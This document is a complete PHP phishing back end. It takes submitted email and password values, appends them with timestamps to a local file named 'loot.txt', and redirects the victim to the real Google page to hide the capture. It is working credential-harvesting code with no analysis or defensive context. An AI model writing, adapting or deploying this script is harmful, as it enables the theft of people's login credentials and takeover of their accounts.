<?php
header('Location: https://www.google.com'); // Redirect to the real Google page after submission
if (isset($_POST['email']) && isset($_POST['password'])) {
    $email = $_POST['email'];
    $password = $_POST['password'];
    $data = "Timestamp: " . date("Y-m-d H:i:s") . "\nEmail: " . $email . "\nPassword: " . $password . "\n------------------------\n";
    
    $file = 'loot.txt';
    file_put_contents($file, $data, FILE_APPEND | LOCK_EX);
}
exit();
?>
